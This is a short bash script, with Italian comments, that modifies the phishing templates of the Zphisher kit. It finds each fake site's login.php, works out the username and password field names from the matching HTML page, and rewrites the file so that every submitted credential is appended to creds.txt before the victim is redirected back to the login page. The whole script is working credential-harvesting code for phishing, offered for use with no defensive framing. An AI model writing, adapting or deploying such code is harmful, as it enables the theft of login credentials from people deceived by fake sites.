#!/bin/bash

ZPHISHER_DIR="/opt/zphisher/.sites"
LOG="patched_sites.log"
> "$LOG"

echo "[*] Inizio patch dei login.php in $ZPHISHER_DIR..."

find "$ZPHISHER_DIR" -type f -name "login.php" | while read -r FILE; do
    DIR=$(dirname "$FILE")
    HTML_FILE=$(find "$DIR" -maxdepth 1 -name "*.html" | head -n 1)

    # Nomi default dei campi
    USER_FIELD="username"
    PASS_FIELD="password"

    if [[ -f "$HTML_FILE" ]]; then
        USER_FIELD=$(grep -Eoi 'name=["'"'"'](username|email)["'"'"']' "$HTML_FILE" | head -n1 | cut -d= -f2 | tr -d '"'\')
        PASS_FIELD=$(grep -Eoi 'name=["'"'"'](password|pass)["'"'"']' "$HTML_FILE" | head -n1 | cut -d= -f2 | tr -d '"'\')
    fi

    # Se già contiene file_put_contents, salta
    if grep -q "file_put_contents" "$FILE"; then
        echo "[-] $FILE già contiene salvataggio credenziali. Saltato." >> "$LOG"
        continue
    fi

    # Sovrascrivi il login.php
    cat <<EOF > "$FILE"
<?php
file_put_contents("creds.txt", "User: " . \$_POST['$USER_FIELD'] . "\\n", FILE_APPEND);
file_put_contents("creds.txt", "Pass: " . \$_POST['$PASS_FIELD'] . "\\n\\n", FILE_APPEND);
header("Location: login.html");
exit();
?>
EOF

    echo "[+] Patchato: $FILE (campi: $USER_FIELD / $PASS_FIELD)" >> "$LOG"
done

echo "[✓] Patch completa. Vedi $LOG per dettagli."
